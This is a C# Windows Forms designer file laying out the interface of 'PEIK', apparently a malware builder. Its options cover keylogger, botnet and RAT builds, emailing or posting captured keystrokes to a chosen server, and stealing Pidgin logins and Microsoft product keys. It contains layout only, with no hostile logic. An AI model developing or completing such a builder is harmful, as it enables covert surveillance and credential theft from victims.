namespace PEIK
{
    partial class MainForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.menuStrip = new System.Windows.Forms.MenuStrip();
            this.fileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.buildToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.statusStrip = new System.Windows.Forms.StatusStrip();
            this.tabControl = new System.Windows.Forms.TabControl();
            this.tabPageMain = new System.Windows.Forms.TabPage();
            this.groupBoxMainType = new System.Windows.Forms.GroupBox();
            this.radioButtonMainRAT = new System.Windows.Forms.RadioButton();
            this.radioButtonMainBotnet = new System.Windows.Forms.RadioButton();
            this.radioButtonMainKeylogger = new System.Windows.Forms.RadioButton();
            this.tabPageKeylogger = new System.Windows.Forms.TabPage();
            this.groupBoxLogType = new System.Windows.Forms.GroupBox();
            this.radioButtonKeyloggerLogFull = new System.Windows.Forms.RadioButton();
            this.radioButtonKeyloggerLogAlphaNumeric = new System.Windows.Forms.RadioButton();
            this.labelKeyloggerInterval = new System.Windows.Forms.Label();
            this.numericUpDownKeyloggerInterval = new System.Windows.Forms.NumericUpDown();
            this.checkBoxKeyloggerWindowTitles = new System.Windows.Forms.CheckBox();
            this.groupBoxKeyloggerSend = new System.Windows.Forms.GroupBox();
            this.radioButton = new System.Windows.Forms.RadioButton();
            this.radioButtonKeyloggerSendEmail = new System.Windows.Forms.RadioButton();
            this.groupBoxKeyloggerEmail = new System.Windows.Forms.GroupBox();
            this.textBoxKeyloggerEmailPort = new System.Windows.Forms.TextBox();
            this.labelKeyloggerEmailPort = new System.Windows.Forms.Label();
            this.textBoxKeyloggerEmailServer = new System.Windows.Forms.TextBox();
            this.comboBoxKeyloggerEmailServer = new System.Windows.Forms.ComboBox();
            this.labelKeyloggerEmailServer = new System.Windows.Forms.Label();
            this.textBoxKeyloggerEmailPassword = new System.Windows.Forms.TextBox();
            this.labelKeyloggerEmailPassword = new System.Windows.Forms.Label();
            this.textBoxKeyloggerEmailAddress = new System.Windows.Forms.TextBox();
            this.labelKeyloggerEmailFromName = new System.Windows.Forms.Label();
            this.tabPageStealer = new System.Windows.Forms.TabPage();
            this.checkBoxStealerPidgin = new System.Windows.Forms.CheckBox();
            this.checkBoxStealersMicrosoftKeys = new System.Windows.Forms.CheckBox();
            this.checkBoxStealersRSBot = new System.Windows.Forms.CheckBox();
            this.groupBoxKeyloggerWebpage = new System.Windows.Forms.GroupBox();
            this.textBoxKeyloggerWebpageUrl = new System.Windows.Forms.TextBox();
            this.labelKeyloggerWebpageUrl = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.labelKeyloggerWebpagePasskey = new System.Windows.Forms.Label();
            this.menuStrip.SuspendLayout();
            this.tabControl.SuspendLayout();
            this.tabPageMain.SuspendLayout();
            this.groupBoxMainType.SuspendLayout();
            this.tabPageKeylogger.SuspendLayout();
            this.groupBoxLogType.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).BeginInit();
            this.groupBoxKeyloggerSend.SuspendLayout();
            this.groupBoxKeyloggerEmail.SuspendLayout();
            this.tabPageStealer.SuspendLayout();
            this.groupBoxKeyloggerWebpage.SuspendLayout();
            this.SuspendLayout();
            // 
            // menuStrip
            // 
            this.menuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fileToolStripMenuItem});
            this.menuStrip.Location = new System.Drawing.Point(0, 0);
            this.menuStrip.Name = "menuStrip";
            this.menuStrip.Size = new System.Drawing.Size(555, 24);
            this.menuStrip.TabIndex = 0;
            this.menuStrip.Text = "menuStrip1";
            // 
            // fileToolStripMenuItem
            // 
            this.fileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.buildToolStripMenuItem,
            this.exitToolStripMenuItem});
            this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
            this.fileToolStripMenuItem.Size = new System.Drawing.Size(37, 20);
            this.fileToolStripMenuItem.Text = "&File";
            // 
            // buildToolStripMenuItem
            // 
            this.buildToolStripMenuItem.Name = "buildToolStripMenuItem";
            this.buildToolStripMenuItem.Size = new System.Drawing.Size(101, 22);
            this.buildToolStripMenuItem.Text = "&Build";
            // 
            // exitToolStripMenuItem
            // 
            this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
            this.exitToolStripMenuItem.Size = new System.Drawing.Size(101, 22);
            this.exitToolStripMenuItem.Text = "E&xit";
            this.exitToolStripMenuItem.Click += new System.EventHandler(this.ExitToolStripMenuItemClick);
            // 
            // statusStrip
            // 
            this.statusStrip.Location = new System.Drawing.Point(0, 386);
            this.statusStrip.Name = "statusStrip";
            this.statusStrip.Size = new System.Drawing.Size(555, 22);
            this.statusStrip.TabIndex = 1;
            this.statusStrip.Text = "statusStrip1";
            // 
            // tabControl
            // 
            this.tabControl.Controls.Add(this.tabPageMain);
            this.tabControl.Controls.Add(this.tabPageKeylogger);
            this.tabControl.Controls.Add(this.tabPageStealer);
            this.tabControl.Dock = System.Windows.Forms.DockStyle.Fill;
            this.tabControl.Location = new System.Drawing.Point(0, 24);
            this.tabControl.Name = "tabControl";
            this.tabControl.SelectedIndex = 0;
            this.tabControl.Size = new System.Drawing.Size(555, 362);
            this.tabControl.TabIndex = 2;
            // 
            // tabPageMain
            // 
            this.tabPageMain.Controls.Add(this.groupBoxMainType);
            this.tabPageMain.Location = new System.Drawing.Point(4, 22);
            this.tabPageMain.Name = "tabPageMain";
            this.tabPageMain.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageMain.Size = new System.Drawing.Size(547, 336);
            this.tabPageMain.TabIndex = 0;
            this.tabPageMain.Text = "Main";
            this.tabPageMain.UseVisualStyleBackColor = true;
            // 
            // groupBoxMainType
            // 
            this.groupBoxMainType.Controls.Add(this.radioButtonMainRAT);
            this.groupBoxMainType.Controls.Add(this.radioButtonMainBotnet);
            this.groupBoxMainType.Controls.Add(this.radioButtonMainKeylogger);
            this.groupBoxMainType.Location = new System.Drawing.Point(9, 7);
            this.groupBoxMainType.Name = "groupBoxMainType";
            this.groupBoxMainType.Size = new System.Drawing.Size(122, 88);
            this.groupBoxMainType.TabIndex = 0;
            this.groupBoxMainType.TabStop = false;
            this.groupBoxMainType.Text = "Type";
            // 
            // radioButtonMainRAT
            // 
            this.radioButtonMainRAT.AutoSize = true;
            this.radioButtonMainRAT.Location = new System.Drawing.Point(6, 65);
            this.radioButtonMainRAT.Name = "radioButtonMainRAT";
            this.radioButtonMainRAT.Size = new System.Drawing.Size(47, 17);
            this.radioButtonMainRAT.TabIndex = 2;
            this.radioButtonMainRAT.TabStop = true;
            this.radioButtonMainRAT.Text = "RAT";
            this.radioButtonMainRAT.UseVisualStyleBackColor = true;
            // 
            // radioButtonMainBotnet
            // 
            this.radioButtonMainBotnet.AutoSize = true;
            this.radioButtonMainBotnet.Location = new System.Drawing.Point(6, 42);
            this.radioButtonMainBotnet.Name = "radioButtonMainBotnet";
            this.radioButtonMainBotnet.Size = new System.Drawing.Size(56, 17);
            this.radioButtonMainBotnet.TabIndex = 1;
            this.radioButtonMainBotnet.TabStop = true;
            this.radioButtonMainBotnet.Text = "Botnet";
            this.radioButtonMainBotnet.UseVisualStyleBackColor = true;
            // 
            // radioButtonMainKeylogger
            // 
            this.radioButtonMainKeylogger.AutoSize = true;
            this.radioButtonMainKeylogger.Location = new System.Drawing.Point(6, 19);
            this.radioButtonMainKeylogger.Name = "radioButtonMainKeylogger";
            this.radioButtonMainKeylogger.Size = new System.Drawing.Size(110, 17);
            this.radioButtonMainKeylogger.TabIndex = 0;
            this.radioButtonMainKeylogger.TabStop = true;
            this.radioButtonMainKeylogger.Text = "Keylogger/Stealer";
            this.radioButtonMainKeylogger.UseVisualStyleBackColor = true;
            // 
            // tabPageKeylogger
            // 
            this.tabPageKeylogger.Controls.Add(this.groupBoxKeyloggerWebpage);
            this.tabPageKeylogger.Controls.Add(this.groupBoxLogType);
            this.tabPageKeylogger.Controls.Add(this.labelKeyloggerInterval);
            this.tabPageKeylogger.Controls.Add(this.numericUpDownKeyloggerInterval);
            this.tabPageKeylogger.Controls.Add(this.checkBoxKeyloggerWindowTitles);
            this.tabPageKeylogger.Controls.Add(this.groupBoxKeyloggerSend);
            this.tabPageKeylogger.Controls.Add(this.groupBoxKeyloggerEmail);
            this.tabPageKeylogger.Location = new System.Drawing.Point(4, 22);
            this.tabPageKeylogger.Name = "tabPageKeylogger";
            this.tabPageKeylogger.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageKeylogger.Size = new System.Drawing.Size(547, 336);
            this.tabPageKeylogger.TabIndex = 1;
            this.tabPageKeylogger.Text = "Keylogger";
            this.tabPageKeylogger.UseVisualStyleBackColor = true;
            // 
            // groupBoxLogType
            // 
            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogFull);
            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogAlphaNumeric);
            this.groupBoxLogType.Location = new System.Drawing.Point(214, 61);
            this.groupBoxLogType.Name = "groupBoxLogType";
            this.groupBoxLogType.Size = new System.Drawing.Size(200, 49);
            this.groupBoxLogType.TabIndex = 2;
            this.groupBoxLogType.TabStop = false;
            this.groupBoxLogType.Text = "Log Type";
            // 
            // radioButtonKeyloggerLogFull
            // 
            this.radioButtonKeyloggerLogFull.AutoSize = true;
            this.radioButtonKeyloggerLogFull.Location = new System.Drawing.Point(117, 19);
            this.radioButtonKeyloggerLogFull.Name = "radioButtonKeyloggerLogFull";
            this.radioButtonKeyloggerLogFull.Size = new System.Drawing.Size(41, 17);
            this.radioButtonKeyloggerLogFull.TabIndex = 1;
            this.radioButtonKeyloggerLogFull.TabStop = true;
            this.radioButtonKeyloggerLogFull.Text = "Full";
            this.radioButtonKeyloggerLogFull.UseVisualStyleBackColor = true;
            // 
            // radioButtonKeyloggerLogAlphaNumeric
            // 
            this.radioButtonKeyloggerLogAlphaNumeric.AutoSize = true;
            this.radioButtonKeyloggerLogAlphaNumeric.Location = new System.Drawing.Point(6, 19);
            this.radioButtonKeyloggerLogAlphaNumeric.Name = "radioButtonKeyloggerLogAlphaNumeric";
            this.radioButtonKeyloggerLogAlphaNumeric.Size = new System.Drawing.Size(91, 17);
            this.radioButtonKeyloggerLogAlphaNumeric.TabIndex = 0;
            this.radioButtonKeyloggerLogAlphaNumeric.TabStop = true;
            this.radioButtonKeyloggerLogAlphaNumeric.Text = "AlphaNumeric";
            this.radioButtonKeyloggerLogAlphaNumeric.UseVisualStyleBackColor = true;
            // 
            // labelKeyloggerInterval
            // 
            this.labelKeyloggerInterval.AutoSize = true;
            this.labelKeyloggerInterval.Location = new System.Drawing.Point(279, 36);
            this.labelKeyloggerInterval.Name = "labelKeyloggerInterval";
            this.labelKeyloggerInterval.Size = new System.Drawing.Size(93, 13);
            this.labelKeyloggerInterval.TabIndex = 9;
            this.labelKeyloggerInterval.Text = "Interval in Minutes";
            // 
            // numericUpDownKeyloggerInterval
            // 
            this.numericUpDownKeyloggerInterval.Location = new System.Drawing.Point(215, 34);
            this.numericUpDownKeyloggerInterval.Maximum = new decimal(new int[] {
            43200,
            0,
            0,
            0});
            this.numericUpDownKeyloggerInterval.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.numericUpDownKeyloggerInterval.Name = "numericUpDownKeyloggerInterval";
            this.numericUpDownKeyloggerInterval.Size = new System.Drawing.Size(58, 20);
            this.numericUpDownKeyloggerInterval.TabIndex = 3;
            this.numericUpDownKeyloggerInterval.Value = new decimal(new int[] {
            1,
            0,
            0,
            0});
            // 
            // checkBoxKeyloggerWindowTitles
            // 
            this.checkBoxKeyloggerWindowTitles.AutoSize = true;
            this.checkBoxKeyloggerWindowTitles.Location = new System.Drawing.Point(214, 15);
            this.checkBoxKeyloggerWindowTitles.Name = "checkBoxKeyloggerWindowTitles";
            this.checkBoxKeyloggerWindowTitles.Size = new System.Drawing.Size(131, 17);
            this.checkBoxKeyloggerWindowTitles.TabIndex = 2;
            this.checkBoxKeyloggerWindowTitles.Text = "Include Window Titles";
            this.checkBoxKeyloggerWindowTitles.UseVisualStyleBackColor = true;
            // 
            // groupBoxKeyloggerSend
            // 
            this.groupBoxKeyloggerSend.Controls.Add(this.radioButton);
            this.groupBoxKeyloggerSend.Controls.Add(this.radioButtonKeyloggerSendEmail);
            this.groupBoxKeyloggerSend.Location = new System.Drawing.Point(8, 6);
            this.groupBoxKeyloggerSend.Name = "groupBoxKeyloggerSend";
            this.groupBoxKeyloggerSend.Size = new System.Drawing.Size(200, 49);
            this.groupBoxKeyloggerSend.TabIndex = 1;
            this.groupBoxKeyloggerSend.TabStop = false;
            this.groupBoxKeyloggerSend.Text = "Send through...";
            // 
            // radioButton
            // 
            this.radioButton.AutoSize = true;
            this.radioButton.Enabled = false;
            this.radioButton.Location = new System.Drawing.Point(62, 19);
            this.radioButton.Name = "radioButton";
            this.radioButton.Size = new System.Drawing.Size(72, 17);
            this.radioButton.TabIndex = 1;
            this.radioButton.TabStop = true;
            this.radioButton.Text = "Webpage";
            this.radioButton.UseVisualStyleBackColor = true;
            // 
            // radioButtonKeyloggerSendEmail
            // 
            this.radioButtonKeyloggerSendEmail.AutoSize = true;
            this.radioButtonKeyloggerSendEmail.Location = new System.Drawing.Point(6, 19);
            this.radioButtonKeyloggerSendEmail.Name = "radioButtonKeyloggerSendEmail";
            this.radioButtonKeyloggerSendEmail.Size = new System.Drawing.Size(50, 17);
            this.radioButtonKeyloggerSendEmail.TabIndex = 0;
            this.radioButtonKeyloggerSendEmail.TabStop = true;
            this.radioButtonKeyloggerSendEmail.Text = "Email";
            this.radioButtonKeyloggerSendEmail.UseVisualStyleBackColor = true;
            // 
            // groupBoxKeyloggerEmail
            // 
            this.groupBoxKeyloggerEmail.Controls.Add(this.textBoxKeyloggerEmailPort);
            this.groupBoxKeyloggerEmail.Controls.Add(this.labelKeyloggerEmailPort);
            this.groupBoxKeyloggerEmail.Controls.Add(this.textBoxKeyloggerEmailServer);
            this.groupBoxKeyloggerEmail.Controls.Add(this.comboBoxKeyloggerEmailServer);
            this.groupBoxKeyloggerEmail.Controls.Add(this.labelKeyloggerEmailServer);
            this.groupBoxKeyloggerEmail.Controls.Add(this.textBoxKeyloggerEmailPassword);
            this.groupBoxKeyloggerEmail.Controls.Add(this.labelKeyloggerEmailPassword);
            this.groupBoxKeyloggerEmail.Controls.Add(this.textBoxKeyloggerEmailAddress);
            this.groupBoxKeyloggerEmail.Controls.Add(this.labelKeyloggerEmailFromName);
            this.groupBoxKeyloggerEmail.Location = new System.Drawing.Point(8, 61);
            this.groupBoxKeyloggerEmail.Name = "groupBoxKeyloggerEmail";
            this.groupBoxKeyloggerEmail.Size = new System.Drawing.Size(200, 149);
            this.groupBoxKeyloggerEmail.TabIndex = 0;
            this.groupBoxKeyloggerEmail.TabStop = false;
            this.groupBoxKeyloggerEmail.Text = "Email";
            // 
            // textBoxKeyloggerEmailPort
            // 
            this.textBoxKeyloggerEmailPort.Enabled = false;
            this.textBoxKeyloggerEmailPort.Location = new System.Drawing.Point(86, 123);
            this.textBoxKeyloggerEmailPort.Name = "textBoxKeyloggerEmailPort";
            this.textBoxKeyloggerEmailPort.Size = new System.Drawing.Size(100, 20);
            this.textBoxKeyloggerEmailPort.TabIndex = 8;
            // 
            // labelKeyloggerEmailPort
            // 
            this.labelKeyloggerEmailPort.AutoSize = true;
            this.labelKeyloggerEmailPort.Location = new System.Drawing.Point(7, 126);
            this.labelKeyloggerEmailPort.Name = "labelKeyloggerEmailPort";
            this.labelKeyloggerEmailPort.Size = new System.Drawing.Size(26, 13);
            this.labelKeyloggerEmailPort.TabIndex = 7;
            this.labelKeyloggerEmailPort.Text = "Port";
            // 
            // textBoxKeyloggerEmailServer
            // 
            this.textBoxKeyloggerEmailServer.Enabled = false;
            this.textBoxKeyloggerEmailServer.Location = new System.Drawing.Point(86, 97);
            this.textBoxKeyloggerEmailServer.Name = "textBoxKeyloggerEmailServer";
            this.textBoxKeyloggerEmailServer.Size = new System.Drawing.Size(100, 20);
            this.textBoxKeyloggerEmailServer.TabIndex = 6;
            // 
            // comboBoxKeyloggerEmailServer
            // 
            this.comboBoxKeyloggerEmailServer.FormattingEnabled = true;
            this.comboBoxKeyloggerEmailServer.Items.AddRange(new object[] {
            "Gmail",
            "Hotmail",
            "Yahoo",
            "Custom"});
            this.comboBoxKeyloggerEmailServer.Location = new System.Drawing.Point(87, 70);
            this.comboBoxKeyloggerEmailServer.Name = "comboBoxKeyloggerEmailServer";
            this.comboBoxKeyloggerEmailServer.Size = new System.Drawing.Size(99, 21);
            this.comboBoxKeyloggerEmailServer.TabIndex = 5;
            this.comboBoxKeyloggerEmailServer.SelectedIndexChanged += new System.EventHandler(this.ComboBoxKeyloggerEmailServerSelectedIndexChanged);
            // 
            // labelKeyloggerEmailServer
            // 
            this.labelKeyloggerEmailServer.AutoSize = true;
            this.labelKeyloggerEmailServer.Location = new System.Drawing.Point(7, 73);
            this.labelKeyloggerEmailServer.Name = "labelKeyloggerEmailServer";
            this.labelKeyloggerEmailServer.Size = new System.Drawing.Size(66, 13);
            this.labelKeyloggerEmailServer.TabIndex = 4;
            this.labelKeyloggerEmailServer.Text = "Email Server";
            // 
            // textBoxKeyloggerEmailPassword
            // 
            this.textBoxKeyloggerEmailPassword.Location = new System.Drawing.Point(86, 43);
            this.textBoxKeyloggerEmailPassword.Name = "textBoxKeyloggerEmailPassword";
            this.textBoxKeyloggerEmailPassword.Size = new System.Drawing.Size(100, 20);
            this.textBoxKeyloggerEmailPassword.TabIndex = 3;
            this.textBoxKeyloggerEmailPassword.UseSystemPasswordChar = true;
            // 
            // labelKeyloggerEmailPassword
            // 
            this.labelKeyloggerEmailPassword.AutoSize = true;
            this.labelKeyloggerEmailPassword.Location = new System.Drawing.Point(7, 46);
            this.labelKeyloggerEmailPassword.Name = "labelKeyloggerEmailPassword";
            this.labelKeyloggerEmailPassword.Size = new System.Drawing.Size(53, 13);
            this.labelKeyloggerEmailPassword.TabIndex = 2;
            this.labelKeyloggerEmailPassword.Text = "Password";
            // 
            // textBoxKeyloggerEmailAddress
            // 
            this.textBoxKeyloggerEmailAddress.Location = new System.Drawing.Point(86, 17);
            this.textBoxKeyloggerEmailAddress.Name = "textBoxKeyloggerEmailAddress";
            this.textBoxKeyloggerEmailAddress.Size = new System.Drawing.Size(100, 20);
            this.textBoxKeyloggerEmailAddress.TabIndex = 1;
            // 
            // labelKeyloggerEmailFromName
            // 
            this.labelKeyloggerEmailFromName.AutoSize = true;
            this.labelKeyloggerEmailFromName.Location = new System.Drawing.Point(7, 20);
            this.labelKeyloggerEmailFromName.Name = "labelKeyloggerEmailFromName";
            this.labelKeyloggerEmailFromName.Size = new System.Drawing.Size(73, 13);
            this.labelKeyloggerEmailFromName.TabIndex = 0;
            this.labelKeyloggerEmailFromName.Text = "Email Address";
            // 
            // tabPageStealer
            // 
            this.tabPageStealer.Controls.Add(this.checkBoxStealerPidgin);
            this.tabPageStealer.Controls.Add(this.checkBoxStealersMicrosoftKeys);
            this.tabPageStealer.Controls.Add(this.checkBoxStealersRSBot);
            this.tabPageStealer.Location = new System.Drawing.Point(4, 22);
            this.tabPageStealer.Name = "tabPageStealer";
            this.tabPageStealer.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageStealer.Size = new System.Drawing.Size(547, 336);
            this.tabPageStealer.TabIndex = 2;
            this.tabPageStealer.Text = "Stealers";
            this.tabPageStealer.UseVisualStyleBackColor = true;
            // 
            // checkBoxStealerPidgin
            // 
            this.checkBoxStealerPidgin.AutoSize = true;
            this.checkBoxStealerPidgin.Location = new System.Drawing.Point(8, 52);
            this.checkBoxStealerPidgin.Name = "checkBoxStealerPidgin";
            this.checkBoxStealerPidgin.Size = new System.Drawing.Size(89, 17);
            this.checkBoxStealerPidgin.TabIndex = 2;
            this.checkBoxStealerPidgin.Text = "Pidgin Logins";
            this.checkBoxStealerPidgin.UseVisualStyleBackColor = true;
            // 
            // checkBoxStealersMicrosoftKeys
            // 
            this.checkBoxStealersMicrosoftKeys.AutoSize = true;
            this.checkBoxStealersMicrosoftKeys.Location = new System.Drawing.Point(8, 29);
            this.checkBoxStealersMicrosoftKeys.Name = "checkBoxStealersMicrosoftKeys";
            this.checkBoxStealersMicrosoftKeys.Size = new System.Drawing.Size(95, 17);
            this.checkBoxStealersMicrosoftKeys.TabIndex = 1;
            this.checkBoxStealersMicrosoftKeys.Text = "Microsoft Keys";
            this.checkBoxStealersMicrosoftKeys.UseVisualStyleBackColor = true;
            // 
            // checkBoxStealersRSBot
            // 
            this.checkBoxStealersRSBot.AutoSize = true;
            this.checkBoxStealersRSBot.Location = new System.Drawing.Point(8, 6);
            this.checkBoxStealersRSBot.Name = "checkBoxStealersRSBot";
            this.checkBoxStealersRSBot.Size = new System.Drawing.Size(57, 17);
            this.checkBoxStealersRSBot.TabIndex = 0;
            this.checkBoxStealersRSBot.Text = "RSBot";
            this.checkBoxStealersRSBot.UseVisualStyleBackColor = true;
            // 
            // groupBoxKeyloggerWebpage
            // 
            this.groupBoxKeyloggerWebpage.Controls.Add(this.textBox1);
            this.groupBoxKeyloggerWebpage.Controls.Add(this.labelKeyloggerWebpagePasskey);
            this.groupBoxKeyloggerWebpage.Controls.Add(this.textBoxKeyloggerWebpageUrl);
            this.groupBoxKeyloggerWebpage.Controls.Add(this.labelKeyloggerWebpageUrl);
            this.groupBoxKeyloggerWebpage.Enabled = false;
            this.groupBoxKeyloggerWebpage.Location = new System.Drawing.Point(214, 116);
            this.groupBoxKeyloggerWebpage.Name = "groupBoxKeyloggerWebpage";
            this.groupBoxKeyloggerWebpage.Size = new System.Drawing.Size(200, 94);
            this.groupBoxKeyloggerWebpage.TabIndex = 10;
            this.groupBoxKeyloggerWebpage.TabStop = false;
            this.groupBoxKeyloggerWebpage.Text = "Webpage";
            // 
            // textBoxKeyloggerWebpageUrl
            // 
            this.textBoxKeyloggerWebpageUrl.Location = new System.Drawing.Point(60, 20);
            this.textBoxKeyloggerWebpageUrl.Name = "textBoxKeyloggerWebpageUrl";
            this.textBoxKeyloggerWebpageUrl.Size = new System.Drawing.Size(125, 20);
            this.textBoxKeyloggerWebpageUrl.TabIndex = 10;
            // 
            // labelKeyloggerWebpageUrl
            // 
            this.labelKeyloggerWebpageUrl.AutoSize = true;
            this.labelKeyloggerWebpageUrl.Location = new System.Drawing.Point(6, 23);
            this.labelKeyloggerWebpageUrl.Name = "labelKeyloggerWebpageUrl";
            this.labelKeyloggerWebpageUrl.Size = new System.Drawing.Size(48, 13);
            this.labelKeyloggerWebpageUrl.TabIndex = 9;
            this.labelKeyloggerWebpageUrl.Text = "Page Url";
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(60, 46);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(125, 20);
            this.textBox1.TabIndex = 12;
            // 
            // labelKeyloggerWebpagePasskey
            // 
            this.labelKeyloggerWebpagePasskey.AutoSize = true;
            this.labelKeyloggerWebpagePasskey.Location = new System.Drawing.Point(6, 49);
            this.labelKeyloggerWebpagePasskey.Name = "labelKeyloggerWebpagePasskey";
            this.labelKeyloggerWebpagePasskey.Size = new System.Drawing.Size(47, 13);
            this.labelKeyloggerWebpagePasskey.TabIndex = 11;
            this.labelKeyloggerWebpagePasskey.Text = "Passkey";
            // 
            // MainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(555, 408);
            this.Controls.Add(this.tabControl);
            this.Controls.Add(this.statusStrip);
            this.Controls.Add(this.menuStrip);
            this.MainMenuStrip = this.menuStrip;
            this.Name = "MainForm";
            this.Text = "PEIK " + System.Reflection.Assembly.GetExecutingAssembly().GetName().Version;
            this.menuStrip.ResumeLayout(false);
            this.menuStrip.PerformLayout();
            this.tabControl.ResumeLayout(false);
            this.tabPageMain.ResumeLayout(false);
            this.groupBoxMainType.ResumeLayout(false);
            this.groupBoxMainType.PerformLayout();
            this.tabPageKeylogger.ResumeLayout(false);
            this.tabPageKeylogger.PerformLayout();
            this.groupBoxLogType.ResumeLayout(false);
            this.groupBoxLogType.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).EndInit();
            this.groupBoxKeyloggerSend.ResumeLayout(false);
            this.groupBoxKeyloggerSend.PerformLayout();
            this.groupBoxKeyloggerEmail.ResumeLayout(false);
            this.groupBoxKeyloggerEmail.PerformLayout();
            this.tabPageStealer.ResumeLayout(false);
            this.tabPageStealer.PerformLayout();
            this.groupBoxKeyloggerWebpage.ResumeLayout(false);
            this.groupBoxKeyloggerWebpage.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.MenuStrip menuStrip;
        private System.Windows.Forms.ToolStripMenuItem fileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem buildToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem exitToolStripMenuItem;
        private System.Windows.Forms.StatusStrip statusStrip;
        private System.Windows.Forms.TabControl tabControl;
        private System.Windows.Forms.TabPage tabPageMain;
        private System.Windows.Forms.TabPage tabPageKeylogger;
        private System.Windows.Forms.TabPage tabPageStealer;
        private System.Windows.Forms.GroupBox groupBoxMainType;
        private System.Windows.Forms.RadioButton radioButtonMainRAT;
        private System.Windows.Forms.RadioButton radioButtonMainBotnet;
        private System.Windows.Forms.RadioButton radioButtonMainKeylogger;
        private System.Windows.Forms.GroupBox groupBoxKeyloggerSend;
        private System.Windows.Forms.RadioButton radioButton;
        private System.Windows.Forms.RadioButton radioButtonKeyloggerSendEmail;
        private System.Windows.Forms.GroupBox groupBoxKeyloggerEmail;
        private System.Windows.Forms.TextBox textBoxKeyloggerEmailAddress;
        private System.Windows.Forms.Label labelKeyloggerEmailFromName;
        private System.Windows.Forms.TextBox textBoxKeyloggerEmailPassword;
        private System.Windows.Forms.Label labelKeyloggerEmailPassword;
        private System.Windows.Forms.TextBox textBoxKeyloggerEmailPort;
        private System.Windows.Forms.Label labelKeyloggerEmailPort;
        private System.Windows.Forms.TextBox textBoxKeyloggerEmailServer;
        private System.Windows.Forms.ComboBox comboBoxKeyloggerEmailServer;
        private System.Windows.Forms.Label labelKeyloggerEmailServer;
        private System.Windows.Forms.CheckBox checkBoxStealersRSBot;
        private System.Windows.Forms.CheckBox checkBoxStealersMicrosoftKeys;
        private System.Windows.Forms.GroupBox groupBoxLogType;
        private System.Windows.Forms.RadioButton radioButtonKeyloggerLogFull;
        private System.Windows.Forms.RadioButton radioButtonKeyloggerLogAlphaNumeric;
        private System.Windows.Forms.Label labelKeyloggerInterval;
        private System.Windows.Forms.NumericUpDown numericUpDownKeyloggerInterval;
        private System.Windows.Forms.CheckBox checkBoxKeyloggerWindowTitles;
        private System.Windows.Forms.CheckBox checkBoxStealerPidgin;
        private System.Windows.Forms.GroupBox groupBoxKeyloggerWebpage;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Label labelKeyloggerWebpagePasskey;
        private System.Windows.Forms.TextBox textBoxKeyloggerWebpageUrl;
        private System.Windows.Forms.Label labelKeyloggerWebpageUrl;
    }
}

